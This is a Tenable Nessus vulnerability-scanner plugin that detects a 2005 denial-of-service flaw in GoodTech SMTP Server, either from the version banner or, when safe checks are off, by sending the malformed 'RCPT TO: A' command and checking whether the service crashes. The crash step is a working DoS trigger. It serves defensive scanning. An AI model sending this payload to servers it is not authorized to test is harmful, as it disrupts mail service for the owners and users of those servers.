#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18433);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-1931");
  script_bugtraq_id(13888);
  script_osvdb_id(17197);

  script_name(english:"GoodTech SMTP Server Malformed RCPT TO Command DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of GoodTech SMTP Server running on the remote host is
prone to a denial of service attacks that can be triggered by sending
a 'RCPT TO' command with the sole argument 'A'." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-June/034457.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GoodTech SMTP Server 5.15 or newer." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/07");
 script_cvs_date("$Date: 2011/03/11 20:59:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Checks for malformed RCPT TO denial of service vulnerability in GoodTech SMTP Server");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  exit(0);
}

include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");


port = get_service(svc: "smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(1);


# If the banner suggests it's GoodTech...
banner = get_smtp_banner(port:port);
if (banner && "Simple Mail Transfer Service Ready. Version" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # nb: the original advisory only talks about 5.14 as vulnerable, 
    #     but I'd be very surprised if a flaw such as this crept into
    #     just one version. :-)
    if (banner =~ "Version ([0-4]\.|5\.(0|1[0-4][^0-9]))") {
      report = 
"Note that Nessus has determined the vulnerability exists on the
remote host simply by looking at the installed version number of
GoodTech SMTP Server.
";
      security_warning(port:port, extra:report);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(port:port, helo:rand_str());
    if (!soc) exit(1);

    c = string("RCPT TO: A");
    send(socket:soc, data: c+'\r\n');
    s = smtp_recv_line(socket:soc);

    # If it's down, try once to reconnect.
    if (!s) {
      close(soc);
      sleep(1);
      # Is the daemon history?
      soc = open_sock_tcp(port);
      if (!soc) {
        if (service_is_dead(port: port) > 0)
          security_warning(port);
        exit(0);
      }
    }

    # Let's be nice.
    smtp_close(socket: soc);
  }
}
